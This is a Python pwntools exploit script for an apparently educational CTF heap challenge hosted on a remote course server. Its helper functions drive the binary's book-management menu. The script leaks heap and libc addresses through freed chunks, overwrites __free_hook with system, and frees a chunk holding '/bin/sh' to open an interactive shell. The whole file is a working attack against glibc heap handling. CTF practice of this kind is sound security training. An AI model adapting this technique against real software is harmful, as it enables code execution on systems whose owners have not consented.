
from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./easyheap')
r = remote('edu-ctf.zoolab.org', 30211)

def add_book(idx, name_len, name, price):
    r.sendlineafter("> ", str(1))
    r.sendlineafter("Index: ", str(idx))
    r.sendlineafter("name: ", str(name_len))
    r.sendafter("Name: ", name)
    r.sendlineafter("Price: ", str(price))



def delete_book(idx):
    r.sendlineafter("> ", str(2))
    r.sendlineafter("delete: ", str(idx))


def edit_book(idx, name, price):
    
    r.sendlineafter("> ", str(3))

    r.sendlineafter("edit: ", str(idx))
    r.sendafter("Name: ", name)
    r.sendlineafter("Price: ", str(price))
    

def list_book():
    r.sendlineafter("> ", str(4))

def get_name_from_idx(idx):
    r.sendlineafter("> ", str(5))
    r.sendlineafter("Index: ", str(idx))


       

# 1. Leak heap address
def leak_heap_addr():
    add_book(0, 0x410, 'mark', 300)
    add_book(1, 0x410, 'mobiln', 300)

    delete_book(0)
    list_book()
    r.recvuntil("Index:\t")
    test_addr = r.recvuntil("\n")
    heap_addr = int(test_addr[:-1]) - 0x10
    # print(hex(test_addr[:-1]))
    print(hex(heap_addr))
    return heap_addr

# 1. Leak heap & libc address
def leak_libc_addr():
    add_book(0, 0x410, 'mark', 300)
    add_book(1, 0x20, 'mark', 300)
    add_book(2, 0x410, 'mark', 300)
    add_book(3, 0x10, 'mark', 300)

    delete_book(0)
    delete_book(1)

    delete_book(2)

    get_name_from_idx(1)

    r.recvuntil("Name: ")
    a = r.recvline()
    heap_A = int.from_bytes(a[:-1], 'little')
    # print(hex(heap_A))
    target = heap_A + 0x30
    # print(hex(target))
    heap_base = heap_A - 0x2a0
    print("Heap base: ", heap_base)

    edit_book(2, p64(target), 500)
    get_name_from_idx(1)
    r.recvuntil("Name: ")
    a = r.recvline()
    main_arena = int.from_bytes(a[:-1], 'little')
    libc = main_arena - 0x1ebbe0
    print("libc: ", hex(libc))

    return heap_base, libc

def exploit(heap_base, libc_base, free_hook, _system):
    # add new chunk 3 to tcache
    delete_book(3)
    # change C's name pointer to B
    add_book(4, 0x28, p64(heap_base + 0x6f0), 300)
    print(hex(heap_base+0x6f0))
    edit_book(2, p64(free_hook - 8), 300)

    # modify free_hook to system
    add_book(5, 0x28, b'/bin/sh\x00' + p64(_system), 300)

    # get shell from release
    delete_book(5)
    r.interactive()

heap_base, libc_base = leak_libc_addr()
free_hook = libc_base + 0x1eeb28
_system = libc_base + 0x55410
print("free hook: ", hex(free_hook))
print("system: ", hex(_system))

exploit(heap_base, libc_base, free_hook, _system)

